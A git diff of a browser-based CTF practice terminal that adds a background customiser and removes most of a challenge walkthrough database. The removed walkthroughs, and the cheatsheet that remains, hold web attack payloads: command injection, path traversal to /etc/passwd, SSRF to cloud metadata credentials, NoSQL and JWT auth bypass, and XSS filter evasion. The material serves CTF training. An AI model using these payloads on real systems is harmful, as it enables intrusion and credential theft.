@@ -181,11 +181,131 @@
         }
         .status-tools { color: var(--sapphire); }
         @keyframes pulse { 0%,100%{opacity:1;} 50%{opacity:0.35;} }
+
+        /* ── Background image (user-customizable) ── */
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            z-index: 0;
+            background: var(--terminal-bg, url('/images/Death_.jpg')) center/cover no-repeat;
+            opacity: var(--terminal-bg-opacity, 0.18);
+            pointer-events: none;
+            transition: opacity 0.4s, background 0.4s;
+        }
+
+        /* ── BG Menu panel ── */
+        #bg-menu {
+            display: none;
+            position: fixed;
+            top: 50px;
+            right: 16px;
+            z-index: 1000;
+            background: rgba(24,24,37,0.97);
+            border: 1px solid rgba(203,166,247,0.3);
+            border-radius: 12px;
+            padding: 18px 20px;
+            min-width: 260px;
+            backdrop-filter: blur(20px);
+            box-shadow: 0 8px 40px rgba(0,0,0,0.7), 0 0 0 1px rgba(203,166,247,0.08);
+        }
+        #bg-menu.open { display: block; animation: menuIn 0.18s ease; }
+        @keyframes menuIn { from { opacity:0; transform: translateY(-8px) scale(0.97); } to { opacity:1; transform: none; } }
+        #bg-menu h3 {
+            color: var(--mauve);
+            font-size: 0.75rem;
+            letter-spacing: 2px;
+            margin-bottom: 14px;
+            text-transform: uppercase;
+        }
+        .bg-preset-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 14px;
+        }
+        .bg-preset {
+            width: 100%;
+            aspect-ratio: 16/9;
+            border-radius: 6px;
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: border-color 0.2s, transform 0.15s;
+            background-size: cover;
+            background-position: center;
+        }
+        .bg-preset:hover { border-color: var(--mauve); transform: scale(1.05); }
+        .bg-preset.active { border-color: var(--green); }
+        .bg-menu-row { display: flex; align-items: center; gap: 10px; margin-bottom: 10px; }
+        .bg-menu-label { color: var(--subtext1); font-size: 0.68rem; letter-spacing: 1px; min-width: 70px; }
+        .bg-opacity-slider {
+            flex: 1;
+            appearance: none;
+            height: 4px;
+            border-radius: 2px;
+            background: var(--surface1);
+            outline: none;
+            cursor: pointer;
+        }
+        .bg-opacity-slider::-webkit-slider-thumb {
+            appearance: none;
+            width: 14px; height: 14px;
+            border-radius: 50%;
+            background: var(--mauve);
+            box-shadow: 0 0 6px rgba(203,166,247,0.5);
+        }
+        .bg-upload-btn {
+            width: 100%;
+            padding: 8px;
+            background: rgba(203,166,247,0.1);
+            border: 1px dashed rgba(203,166,247,0.4);
+            border-radius: 8px;
+            color: var(--mauve);
+            font-family: inherit;
+            font-size: 0.7rem;
+            letter-spacing: 1px;
+            cursor: pointer;
+            text-align: center;
+            transition: background 0.2s, border-color 0.2s;
+            margin-top: 4px;
+        }
+        .bg-upload-btn:hover { background: rgba(203,166,247,0.18); border-color: var(--mauve); }
+        #bg-file-input { display: none; }
+        .bg-menu-close {
+            position: absolute;
+            top: 10px; right: 12px;
+            background: none; border: none;
+            color: var(--subtext0); font-size: 1rem;
+            cursor: pointer; padding: 2px 6px;
+            border-radius: 4px;
+            transition: color 0.2s;
+        }
+        .bg-menu-close:hover { color: var(--red); }
     </style>
 </head>
 <body>
     <!-- Animated nebula canvas -->
     <canvas id="bg-canvas"></canvas>
+
+
+    <!-- Background customiser panel -->
+    <div id="bg-menu">
+        <button class="bg-menu-close" onclick="toggleBgMenu()">✕</button>
+        <h3>&#9633; BACKGROUND</h3>
+        <div class="bg-preset-grid">
+            <div class="bg-preset active"  id="preset-death"  style="background-image:url('/images/Death_.jpg')"   onclick="setBgPreset('death')"  title="Death"></div>
+            <div class="bg-preset"         id="preset-nebula" style="background:radial-gradient(ellipse at 30% 60%,rgba(203,166,247,.35),rgba(137,180,250,.15),#11111b);" onclick="setBgPreset('nebula')" title="Nebula"></div>
+            <div class="bg-preset"         id="preset-none"   style="background:var(--crust);"                    onclick="setBgPreset('none')"   title="None (solid)"></div>
+        </div>
+        <div class="bg-menu-row">
+            <span class="bg-menu-label">OPACITY</span>
+            <input type="range" class="bg-opacity-slider" id="bg-opacity" min="0" max="60" value="18"
+                   oninput="setBgOpacity(this.value)">
+            <span id="bg-opacity-val" style="color:var(--mauve);font-size:0.68rem;min-width:28px;text-align:right">18%</span>
+        </div>
+        <label class="bg-upload-btn" for="bg-file-input">&#8679; UPLOAD CUSTOM IMAGE</label>
+        <input type="file" id="bg-file-input" accept="image/*" onchange="uploadBg(this)">
+    </div>
 
     <div class="terminal-topbar">
         <div class="terminal-dots">
@@ -201,6 +321,7 @@
             <span class="ttt-info">kitty &middot; zsh &middot; CTF_TERMINAL v3.1</span>
         </div>
         <div class="terminal-topbar-actions">
+            <button class="topbar-btn" onclick="toggleBgMenu()" title="Change background">BG</button>
             <button class="topbar-btn" onclick="termClear()">CLEAR</button>
             <button class="topbar-btn" onclick="termHelp()">HELP</button>
             <a href="/ctf.html" class="topbar-btn danger">&larr; EXIT</a>
@@ -222,14 +343,15 @@
     </div>
 
     <script>
-    // ════════════════════════════════════════════════════════════
-    //  BXF CTF TERMINAL v4.0  –  80+ CTF tools in your browser
-    // ════════════════════════════════════════════════════════════
 
-    // ── Block native browser popups (they break terminal UX) ──
-    window.alert   = (m) => console.warn('[terminal:alert blocked]', m);
-    window.confirm = (m) => { console.warn('[terminal:confirm blocked]', m); return true; };
-    window.prompt  = (m) => { console.warn('[terminal:prompt blocked]', m); return null; };
+    // ── Block browser dialogs inside the terminal (no popups) ──
+    window.alert   = (m) => console.warn('[terminal:alert]', m);
+    window.confirm = (m) => { console.warn('[terminal:confirm]', m); return true; };
+    window.prompt  = (m) => { console.warn('[terminal:prompt]', m); return null; };
+
+    // ════════════════════════════════════════════════════════════
+    //  BXF CTF TERMINAL v3.0  –  50+ CTF tools in your browser
+    // ════════════════════════════════════════════════════════════
 
     // ── Constants & State (defined FIRST so init can reference them) ──
     const PROMPT = '\r\n\x1b[35m╭─\x1b[0m \x1b[32mentity\x1b[90m@\x1b[34marchlinux \x1b[35m~/ctf \x1b[33m[CTF]\x1b[0m\r\n\x1b[35m╰─❯\x1b[0m ';
@@ -333,20 +455,19 @@
     function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
     (async () => {
         for (const l of BOOT) { term.writeln(l); await sleep(35); }
-        term.write(PROMPT);
-        // First-time tutorial (only once per browser)
+        // ── Restore background from localStorage ──
+        applyStoredBg();
+        // ── First-time tutorial ──
         if (!localStorage.getItem('bxf_term_tut_v1')) {
-            await sleep(600);
-            await termTutorial(false);
+            await sleep(500);
+            pendingAsync = true;
+            await termTutorial();
         } else {
-            // Returning user: show session restore summary
-            const savedCount = Object.keys(VFILES).filter(k => !Object.keys(_VFILES_DEFAULT).includes(k)).length;
-            if (savedCount > 0 || localStorage.getItem('bxf_env')) {
-                await sleep(200);
-                term.writeln(`\x1b[35m[SESSION RESTORED]\x1b[0m \x1b[90mWelcome back — your notes, files and env vars are loaded.\x1b[0m`);
-                term.writeln(`\x1b[90m  Files: ${Object.keys(VFILES).length} · Env vars: ${Object.keys(ENV).length} · History: ${cmdHistory.length} commands\x1b[0m`);
-                term.write(PROMPT);
+            const xFiles = Object.keys(VFILES).filter(k => !Object.keys(_VFILES_DEFAULT).includes(k)).length;
+            if (xFiles > 0) {
+                term.writeln('\x1b[35m[SESSION RESTORED]\x1b[0m \x1b[90mWelcome back — ' + xFiles + ' custom file(s) loaded.\x1b[0m');
             }
+            term.write(PROMPT);
         }
     })();
 
@@ -446,8 +567,8 @@
                 case 'challenges':
                 case 'ctf':       termChallenges(parts); break;
                 case 'solve':     await termSolve(parts); break;
-                case 'tutorial':  await termTutorial(true); break;
-                case 'reset-session': termResetSession(); break;
+                case 'tutorial':  { pendingAsync=true; await termTutorial(); break; }
+                case 'reset-session': { ['bxf_env','bxf_vfiles','bxf_term_tut_v1','bxf_flags'].forEach(k=>localStorage.removeItem(k)); pl('\x1b[33mSession cleared.\x1b[0m Reload to see tutorial again.'); break; }
                 case 'clear':     termClear(); return;
                 case 'history':   cmdHistory.forEach((c,i) => pl(`\x1b[90m${String(cmdHistory.length-i).padStart(4)}\x1b[0m  ${c}`)); break;
                 case 'env':       Object.entries(ENV).forEach(([k,v]) => pl(`\x1b[33m${k}\x1b[0m=${v}`)); break;
@@ -460,32 +581,17 @@
                 case 'uname':     pl(parts.includes('-a') ? 'Linux bxf-browser 5.15.0 #1 SMP x86_64 GNU/Linux' : 'Linux'); break;
                 case 'date':      pl(new Date().toString()); break;
                 case 'echo':      {
-                    // Support: echo text > file  and  echo text >> file
                     const raw2 = raw.replace(/^echo\s+/,'');
-                    const appendM = raw2.match(/^(.+)\s*>>\s*(\S+)$/);
-                    const writeM  = raw2.match(/^(.+)\s*>\s*(\S+)$/);
-                    if (appendM) {
-                        const [,text,fname] = appendM;
-                        if (!VFILES[fname]) VFILES[fname] = [];
-                        VFILES[fname].push(text.replace(/^["']|["']$/g,''));
-                        _saveVFiles(); pl(`Appended to ${fname}`);
-                    } else if (writeM) {
-                        const [,text,fname] = writeM;
-                        VFILES[fname] = [text.replace(/^["']|["']$/g,'')];
-                        _saveVFiles(); pl(`Written to ${fname}`);
-                    } else {
-                        pl(parts.slice(1).join(' '));
-                    }
+                    const am = raw2.match(/^(.+)\s*>>\s*(\S+)$/);
+                    const wm = raw2.match(/^(.+)\s*>\s*(\S+)$/);
+                    if (am) { const [,t,fn]=am; if(!VFILES[fn])VFILES[fn]=[]; VFILES[fn].push(t.replace(/^["']|["']$/g,'')); _saveVFiles(); pl(`Appended to ${fn}`); }
+                    else if (wm) { const [,t,fn]=wm; VFILES[fn]=[t.replace(/^["']|["']$/g,'')]; _saveVFiles(); pl(`Written to ${fn}`); }
+                    else pl(parts.slice(1).join(' '));
                     break;
                 }
-                case 'ls':        {
-                    const files = Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>f.endsWith('/')?`\x1b[32m${f}\x1b[0m`:`\x1b[36m${f}\x1b[0m`);
-                    files.push('\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m');
-                    pl(files.join('   '));
-                    break;
-                }
+                case 'ls':        { const fs=Object.keys(VFILES).filter(f=>!f.startsWith('.')).map(f=>`\x1b[36m${f}\x1b[0m`).concat(['\x1b[90m.bash_history\x1b[0m','\x1b[32mtools/\x1b[0m']); pl(fs.join('   ')); break; }
                 case 'cat':       termCat(parts); break;
-                case 'touch':     { const f=parts[1]; if(!f){pe('touch: missing file');break;} if(!VFILES[f]) VFILES[f]=[]; _saveVFiles(); pl(`Created ${f}`); break; }
+                case 'touch':     { const f=parts[1]; if(!f){pe('touch: missing file');break;} if(!VFILES[f])VFILES[f]=[]; _saveVFiles(); pl(`Created ${f}`); break; }
                 case 'rm':        { const f=parts[1]; if(!f){pe('rm: missing file');break;} if(VFILES[f]){delete VFILES[f];_saveVFiles();pl(`Removed ${f}`);}else pe(`rm: ${f}: does not exist`); break; }
                 case 'curl':      await termCurl(raw, parts); break;
                 case 'wget':      { const u=parts.find(p=>!p.startsWith('-')); if(u) await termCurl('',['curl',u]); else pe('wget: missing URL'); break; }
@@ -907,7 +1013,7 @@
             localStorage.removeItem('bxf_flags'); pl('Flags cleared.');
         }else pe('flag: Usage: flag <save|list|clear>');
     }
-    // ── ENV: load from localStorage (persist across sessions) ──
+    // ── ENV: persist across sessions ──
     const _savedEnv = JSON.parse(localStorage.getItem('bxf_env') || 'null');
     const ENV = _savedEnv || {TARGET:'https://breakersfixer-api.onrender.com',HOME:'/home/entity',USER:'entity'};
     function _saveEnv() { localStorage.setItem('bxf_env', JSON.stringify(ENV)); }
@@ -952,24 +1058,22 @@
     // ══════════════════════════════════════════════════════════
     //  VIRTUAL FS
     // ══════════════════════════════════════════════════════════
-    // ── Virtual FS: persist in localStorage across sessions ──
     const _VFILES_DEFAULT = {
-        'README.txt':['# BXF CTF TERMINAL v4.0','','Type help for all commands.','Type challenges to list all CTF retos.','Type solve <ID> for step-by-step walkthrough.','Target API: https://breakersfixer-api.onrender.com'],
-        'notes.txt':['# My CTF Notes','# Add your own notes: echo "text" >> notes.txt'],
+        'README.txt':['# BXF CTF TERMINAL v4.1','','Type help for commands.','challenges — list retos    solve <ID> — walkthrough','cat cheatsheet.txt — full cheatsheet'],
+        'notes.txt':['# My CTF Notes','# Use: echo "text" >> notes.txt'],
         'cheatsheet.txt':[
             '# CTF QUICK REFERENCE','',
-            '## Encoding','  decode base64 <b64>','  decode hex <hexstr>','  rot13 <text>','  vigenere -d <key> <ct>','  xor <hex> <key>','',
+            '## Encoding','  rot13 <text>','  vigenere <key> <ct>','  base64 -d <b64>','  xor <hex> <key>','  decode hex <hexstr>','',
             '## HTTP','  curl -H "X-Admin-Auth: enabled" <url>','  curl -X POST -d "{\"user\":{\"$ne\":\"\"}}" <url>','  curl -b "role=admin" <url>','',
             '## Crypto','  hash sha256 <text>','  jwt <token>','  rsa --n N --e E --c C','  primes N','  extgcd A B','',
-            '## CTF Workflow','  challenges          list all retos','  solve <ID>         walkthrough','  ctf web            filter by category','',
-            '## Misc','  strings <data>','  brainfuck <code>','  morse <text>','  neofetch','  whois <domain>',
+            '## CTF Workflow','  challenges — list all','  ctf web — filter by cat','  solve <ID> — walkthrough','',
+            '## Files','  echo "text" >> notes.txt','  cat notes.txt','  ls   touch file   rm file',
         ],
-        '.bash_history':['curl https://breakersfixer-api.onrender.com/','decode base64 YnhmezE=','hash sha256 password123','jwt eyJhbGciOiJub25lIn0.eyJhZG1pbiI6dHJ1ZX0.','xor 48454c4c4f 0f0f0f0f0f','solve S1M02','challenges'],
+        '.bash_history':['challenges','solve S1M02','rot13 "cvs{ebg13_vf_pynffvp}"','hash sha256 password123','curl https://breakersfixer-api.onrender.com/'],
     };
     const _savedVF = localStorage.getItem('bxf_vfiles');
     const VFILES = _savedVF ? Object.assign({}, _VFILES_DEFAULT, JSON.parse(_savedVF)) : {..._VFILES_DEFAULT};
     function _saveVFiles() {
-        // Save only user-created/modified files (not defaults)
         const saved = {};
         for (const [k,v] of Object.entries(VFILES)) {
             if (!_VFILES_DEFAULT[k] || JSON.stringify(v) !== JSON.stringify(_VFILES_DEFAULT[k])) saved[k] = v;
@@ -1287,855 +1391,271 @@
         pl(`                              \x1b[34mColors:\x1b[0m   \x1b[31m■\x1b[0m \x1b[33m■\x1b[0m \x1b[32m■\x1b[0m \x1b[36m■\x1b[0m \x1b[34m■\x1b[0m \x1b[35m■\x1b[0m`);
     }
 
+    function termClear() { term.write('\x1b[2J\x1b[H'); term.write(PROMPT); }
+
+    // Clock
+
+    // ══════════════════════════════════════════════════════════
+    //  BACKGROUND SYSTEM
+    // ══════════════════════════════════════════════════════════
+    function applyStoredBg() {
+        const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
+        const url  = stored.url  || "url('/images/Death_.jpg')";
+        const opacity = stored.opacity !== undefined ? stored.opacity : 18;
+        document.documentElement.style.setProperty('--terminal-bg', url);
+        document.documentElement.style.setProperty('--terminal-bg-opacity', opacity/100);
+        const slider = document.getElementById('bg-opacity');
+        const val    = document.getElementById('bg-opacity-val');
+        if (slider) { slider.value = opacity; }
+        if (val)    { val.textContent = opacity + '%'; }
+        // Mark active preset
+        document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
+        const activeId = 'preset-' + (stored.preset || 'death');
+        const el = document.getElementById(activeId);
+        if (el) el.classList.add('active');
+    }
+    function toggleBgMenu() {
+        document.getElementById('bg-menu').classList.toggle('open');
+    }
+    function setBgPreset(preset) {
+        const map = {
+            death:  "url('/images/Death_.jpg')",
+            nebula: "radial-gradient(ellipse at 30% 60%,rgba(203,166,247,0.45),rgba(137,180,250,0.2),#11111b)",
+            none:   "none",
+        };
+        const url = map[preset] || map.death;
+        document.documentElement.style.setProperty('--terminal-bg', url);
+        document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
+        const el = document.getElementById('preset-' + preset);
+        if (el) el.classList.add('active');
+        const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
+        stored.preset = preset;
+        stored.url    = url;
+        localStorage.setItem('bxf_bg', JSON.stringify(stored));
+    }
+    function setBgOpacity(val) {
+        document.documentElement.style.setProperty('--terminal-bg-opacity', val/100);
+        document.getElementById('bg-opacity-val').textContent = val + '%';
+        const stored = JSON.parse(localStorage.getItem('bxf_bg') || '{}');
+        stored.opacity = parseInt(val);
+        localStorage.setItem('bxf_bg', JSON.stringify(stored));
+    }
+    function uploadBg(input) {
+        if (!input.files || !input.files[0]) return;
+        const file = input.files[0];
+        if (!file.type.startsWith('image/')) { term.writeln('\\x1b[31m[!] Error: Not an image file.\\x1b[0m'); return; }
+        // LocalStorage limit is ~5MB, so we cap at 3.5MB to be safe with base64 overhead
+        if (file.size > 3.5 * 1024 * 1024) {
+            term.writeln('\\x1b[31m[!] Error: Image too large (>3.5MB). High-res images break persistence.\\x1b[0m');
+            return;
+        }
+        const reader = new FileReader();
+        reader.onload = (e) => {
+            try {
+                const url = `url("${e.target.result}")`;
+                document.documentElement.style.setProperty('--terminal-bg', url);
+                const stored = { preset: 'custom', url, opacity: parseInt(document.getElementById('bg-opacity').value) };
+                localStorage.setItem('bxf_bg', JSON.stringify(stored));
+                document.querySelectorAll('.bg-preset').forEach(p => p.classList.remove('active'));
+                term.writeln('\\x1b[32m[+] Custom background applied and saved.\\x1b[0m');
+            } catch (err) {
+                term.writeln('\\x1b[31m[!] Error saving to localStorage: Image might be too heavy.\\x1b[0m');
+            }
+        };
+        reader.readAsDataURL(file);
+    }
+    // Close bg menu when clicking outside
+    document.addEventListener('click', (e) => {
+        const menu = document.getElementById('bg-menu');
+        if (menu && menu.classList.contains('open') && !menu.contains(e.target) && !e.target.title?.includes('background') && !e.target.innerText?.includes('BG')) {
+            menu.classList.remove('open');
+        }
+    });
+
     // ══════════════════════════════════════════════════════════
     //  CHALLENGE SYSTEM
     // ══════════════════════════════════════════════════════════
-
-    // Complete challenge database with walkthroughs
     const CHALLENGE_DB = {
-        // ── SEASON 0 ──────────────────────────────────────────
-        'M01': {
-            title: 'The Ghost Endpoint', cat: 'Web', diff: 'Easy', pts: 50,
-            desc: 'Legacy API without auth. Find the sensitive data.',
-            hint: 'Try accessing /api/v1/legacy or /api/flag directly. No auth needed!',
-            steps: [
-                { info: 'Ghost endpoints are APIs left behind without auth checks.', cmd: null },
-                { info: 'First, recon the target with HTTP OPTIONS:', cmd: 'curl -X OPTIONS https://api.breakerxfixer.online/legacy -v' },
-                { info: 'Try the ghost endpoint directly:', cmd: 'curl https://api.breakerxfixer.online/api/v1/secret' },
-                { info: 'Check for common legacy paths:', cmd: 'curl https://api.breakerxfixer.online/api/v0/flag' },
-                { info: 'Concept: enumerate /api/v1/admin, /api/legacy, /v1/internal, etc.', cmd: null },
-            ]
-        },
-        'M02': {
-            title: 'Identity Crisis', cat: 'Web', diff: 'Easy', pts: 50,
-            desc: 'Debug parameter left in login. Bypass it.',
-            hint: 'URL parameters like ?debug=true or ?admin=1 often bypass auth',
-            steps: [
-                { info: 'Debug parameters bypass authentication when not removed from production.', cmd: null },
-                { info: 'Try common debug params:', cmd: 'curl "https://target/login?debug=true&user=admin"' },
-                { info: 'Try admin override:', cmd: 'curl "https://target/login?admin=1&bypass=true"' },
-                { info: 'Try header-based bypass:', cmd: 'curl https://target/login -H "X-Debug: true" -H "X-Forward-For: 127.0.0.1"' },
-                { info: 'Also try cookies:', cmd: 'curl https://target/dashboard -H "Cookie: role=admin; debug=1"' },
-            ]
-        },
-        'M03': {
-            title: 'The Impostor', cat: 'Web', diff: 'Easy', pts: 75,
-            desc: 'Password reset leaks token in URL. Take admin account.',
-            hint: 'Check Referer headers and URL params in reset links',
-            steps: [
-                { info: 'Password reset tokens in URLs get exposed via Referer headers.', cmd: null },
-                { info: 'Trigger a reset for admin and intercept the token:', cmd: 'curl -X POST https://target/reset -d "email=admin@target.com" -v' },
-                { info: 'Use the leaked token:', cmd: 'curl "https://target/reset/confirm?token=LEAKED_TOKEN&user=admin&newpass=hacked"' },
-                { info: 'If the token is in the URL, check Apache/Nginx logs or Referer leaks:', cmd: 'curl https://target/reset -v 2>&1 | grep -i location' },
-            ]
-        },
-        'M04': {
-            title: 'Unstoppable Force', cat: 'Web', diff: 'Medium', pts: 150,
-            desc: 'WAF blocks traditional payloads. Use recursive/nested approach.',
-            hint: 'Double-encode or use nested expressions: <<script>script>',
-            steps: [
-                { info: 'WAF bypass: use double encoding, nested tags, or case variation.', cmd: null },
-                { info: 'Try double URL encoding:', cmd: 'urlencode "<script>alert(1)</script>"' },
-                { info: 'Try case bypass:', cmd: 'echo "<ScRiPt>alert(1)</ScRiPt>" | urlencode' },
-                { info: 'Try HTML entities:', cmd: 'htmlencode "<script>alert(document.cookie)</script>"' },
-                { info: 'Nested tag bypass (WAF strips inner, leaving outer):', cmd: 'echo "<<script>script>alert(1)<</script>/script>"' },
-                { info: 'Test with curl including the payload:', cmd: 'curl "https://target/search?q=%3C%3Cscript%3Escript%3Ealert(1)%3C%3C%2Fscript%3E%2Fscript%3E" -v' },
-            ]
-        },
-        'M05': {
-            title: 'Logic Fallacy', cat: 'Web', diff: 'Medium', pts: 150,
-            desc: 'Checkout prices calculated client-side. Make it cheaper.',
-            hint: 'Intercept the POST request and change the price field',
-            steps: [
-                { info: 'Client-side price validation: intercept and modify the request.', cmd: null },
-                { info: 'Add item to cart then intercept checkout POST:', cmd: 'curl -X POST https://target/checkout -H "Content-Type: application/json" -d \'{"item":"product1","price":0.01,"qty":1}\'' },
-                { info: 'Try negative price:', cmd: 'curl -X POST https://target/checkout -H "Content-Type: application/json" -d \'{"item":"premium","price":-100,"qty":1}\'' },
-                { info: 'Manipulate total directly:', cmd: 'curl -X POST https://target/pay -d "total=0&item=flag&promo=ADMIN100"' },
-            ]
-        },
-        'M06': {
-            title: 'The Wanderer', cat: 'Web', diff: 'Medium', pts: 200,
-            desc: 'LFI beyond simple files. Find server config path.',
-            hint: 'Try /proc/self/environ, /etc/passwd, then /etc/nginx/nginx.conf',
-            steps: [
-                { info: 'LFI (Local File Inclusion) lets you read server files via path traversal.', cmd: null },
-                { info: 'Basic LFI test:', cmd: 'curl "https://target/page?file=../../../../etc/passwd"' },
-                { info: 'Try /proc/self/environ for env vars (often contains flags):', cmd: 'curl "https://target/view?path=../../../proc/self/environ"' },
-                { info: 'Nginx config:', cmd: 'curl "https://target/page?template=../../etc/nginx/sites-enabled/default"' },
-                { info: 'PHP wrappers:', cmd: 'curl "https://target/page?file=php://filter/convert.base64-encode/resource=index.php"' },
-                { info: 'Decode if base64 encoded:', cmd: 'echo "ENCODED_OUTPUT" | base64 -d' },
-            ]
-        },
-        'M07': {
-            title: 'Phantom Ping', cat: 'Web', diff: 'Hard', pts: 400,
-            desc: 'Network diagnostic runs system commands. Chain your commands.',
-            hint: 'Command injection: use ; && | to chain commands',
-            steps: [
-                { info: 'Command injection: the server passes user input directly to shell.', cmd: null },
-                { info: 'Basic injection test:', cmd: 'curl -X POST https://target/ping -d "host=127.0.0.1;id"' },
-                { info: 'Read /etc/passwd:', cmd: 'curl -X POST https://target/ping -d "host=127.0.0.1;cat${IFS}/etc/passwd"' },
-                { info: 'Find the flag file:', cmd: 'curl -X POST https://target/ping -d "host=127.0.0.1;find$IFS/$IFS-name$IFS*flag*"' },
-                { info: 'Cat the flag:', cmd: 'curl -X POST https://target/ping -d "host=127.0.0.1;cat${IFS}/flag.txt"' },
-                { info: 'If spaces blocked, use ${IFS} or {cat,/flag.txt}:', cmd: 'curl -X POST https://target/ping -d "host=127.0.0.1;{cat,/flag.txt}"' },
-            ]
-        },
-        'M08': {
-            title: 'Shattered Trust', cat: 'Web', diff: 'Hard', pts: 400,
-            desc: 'JWT auth with weak secret. Forge an admin token.',
-            hint: 'Decode the JWT, crack the secret, forge admin claims',
-            steps: [
-                { info: 'JWT (JSON Web Tokens) can be exploited if the secret is weak.', cmd: null },
-                { info: 'First decode the token (get it from login response cookies/headers):', cmd: 'jwt eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.SIGNATURE' },
-                { info: 'Try the "none" algorithm attack:', cmd: 'jwt forge --alg none --claims \'{"user":"admin","role":"admin"}\'' },
-                { info: 'Bruteforce common secrets:', cmd: 'jwt crack eyJhbGciOiJIUzI1NiJ9.PAYLOAD.SIG' },
-                { info: 'Forge with known secret "secret":', cmd: 'jwt sign --secret "secret" \'{"user":"admin","role":"admin"}\'' },
-                { info: 'Send forged token:', cmd: 'curl https://target/admin -H "Authorization: Bearer FORGED_JWT"' },
-            ]
-        },
-        'M09': {
-            title: 'Careless Whispers', cat: 'Web', diff: 'Easy', pts: 50,
-            desc: 'Try bad HTTP methods. Sometimes blocked = revealing.',
-            hint: 'Try OPTIONS, TRACE, PUT, DELETE on the endpoint',
-            steps: [
-                { info: 'HTTP verb tampering: servers sometimes reveal info on unexpected methods.', cmd: null },
-                { info: 'Check allowed methods:', cmd: 'curl -X OPTIONS https://target/api -v 2>&1 | grep -i allow' },
-                { info: 'Try TRACE (reveals proxied headers):', cmd: 'curl -X TRACE https://target/ -v' },
-                { info: 'Try PUT:', cmd: 'curl -X PUT https://target/flag -d "test" -v' },
-                { info: 'Try DELETE:', cmd: 'curl -X DELETE https://target/flag -v' },
-                { info: 'Try HEAD to get headers without body:', cmd: 'curl -X HEAD https://target/secret -v 2>&1 | grep -i flag' },
-            ]
-        },
-        'M10': {
-            title: 'NoSQL Nightmare', cat: 'Web', diff: 'Insane', pts: 1000,
-            desc: 'NoSQL injection via JSON operators.',
-            hint: 'MongoDB injection: use $ne, $gt, $regex operators',
-            steps: [
-                { info: 'NoSQL injection exploits MongoDB-style operators ($ne, $gt, $regex).', cmd: null },
-                { info: 'Basic $ne (not equal) bypass:', cmd: 'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$ne":""},"pass":{"$ne":""}}\'' },
-                { info: 'Regex-based username extraction:', cmd: 'curl -X POST https://target/login -H "Content-Type: application/json" -d \'{"user":{"$regex":"^a"},"pass":{"$ne":""}}\'' },
-                { info: 'Extract all users:', cmd: 'curl -X POST https://target/users -H "Content-Type: application/json" -d \'{"filter":{"$where":"1==1"}}\'' },
-                { info: 'Find flag with where clause:', cmd: 'curl -X POST https://target/data -H "Content-Type: application/json" -d \'{"query":{"$where":"this.flag != null"}}\'' },
-            ]
-        },
-        'M11': {
-            title: 'The Core Breach', cat: 'Web', diff: 'Hard', pts: 500,
-            desc: 'SSRF: use portal to reach internal services.',
-            hint: 'Server-Side Request Forgery: make the server fetch internal URLs',
-            steps: [
-                { info: 'SSRF (Server Side Request Forgery): use the server as a proxy to reach internal IPs.', cmd: null },
-                { info: 'Test basic SSRF:', cmd: 'curl -X POST https://target/fetch -d "url=http://127.0.0.1/"' },
-                { info: 'Reach internal services:', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/"' },
-                { info: 'AWS metadata service:', cmd: 'curl -X POST https://target/fetch -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"' },
-                { info: 'Internal port scan:', cmd: 'curl -X POST https://target/fetch -d "url=http://127.0.0.1:8080/flag"' },
-                { info: 'Try file:// scheme:', cmd: 'curl -X POST https://target/fetch -d "url=file:///etc/passwd"' },
-            ]
-        },
-        'M12': {
-            title: 'The XORacle', cat: 'Crypto', diff: 'Easy', pts: 100,
-            desc: 'XOR encrypted flag. Break the lock.',
-            hint: 'If you know part of the plaintext (like "bxf{"), XOR it with ciphertext to get the key',
-            steps: [
-                { info: 'XOR cipher: if key repeats and you know plaintext, you can extract the key.', cmd: null },
-                { info: 'Known-plaintext attack: XOR ciphertext with known prefix:', cmd: 'xor "48 1a 0f 37 63 2e 5b" "bxf{"' },
-                { info: 'If you have the full hex ciphertext:', cmd: 'xor "CIPHERTEXT_HEX" "bxf{" --key' },
-                { info: 'Try common CTF keys:', cmd: 'xor "CIPHERTEXT" "key"' },
-                { info: 'Bruteforce single-byte XOR:', cmd: 'python3 -c "c=bytes.fromhex(\'CIPHERTEXT_HEX\');[print(k,bytes([b^k for b in c])) for k in range(256)]"' },
-                { info: 'Multi-byte key: use Kasiski/IC method or try common keys like 0x37, 0x41, 0x4B', cmd: null },
-            ]
-        },
-        'M13': {
-            title: 'Shattered RSA', cat: 'Crypto', diff: 'Medium', pts: 250,
-            desc: 'n=3891783853, e=65537, c=1130635294. Weak primes!',
-            hint: 'Factor n using small primes, then compute d and decrypt',
-            steps: [
-                { info: 'Weak RSA: n is small enough to factor directly.', cmd: null },
-                { info: 'Factor n (find p and q):', cmd: 'primes 3891783853' },
-                { info: 'Once you have p and q, compute phi(n):', cmd: 'python3 -c "p=62327;q=62459;n=p*q;e=65537;phi=(p-1)*(q-1);d=pow(e,-1,phi);c=1130635294;m=pow(c,d,n);print(bytes.fromhex(hex(m)[2:]).decode())"' },
-                { info: 'Full RSA decrypt with rsa command:', cmd: 'rsa --n 3891783853 --e 65537 --c 1130635294' },
-                { info: 'Or use modular exponentiation:', cmd: 'modpow 1130635294 D N' },
-                { info: 'Cross-check at factordb.com or use extgcd to find d:', cmd: 'extgcd 65537 3891738228' },
-            ]
-        },
-        'M14': {
-            title: 'Buffer Overflow 101', cat: 'Pwn', diff: 'Easy', pts: 150,
-            desc: 'Classic BOF. Overwrite volatile variables beside buffer.',
-            hint: 'Send more bytes than the buffer holds to overwrite adjacent memory',
-            steps: [
-                { info: 'Buffer overflow: write past the buffer to overwrite adjacent variables.', cmd: null },
-                { info: 'Find buffer size with pattern:', cmd: 'python3 -c "print(\'A\'*100)"' },
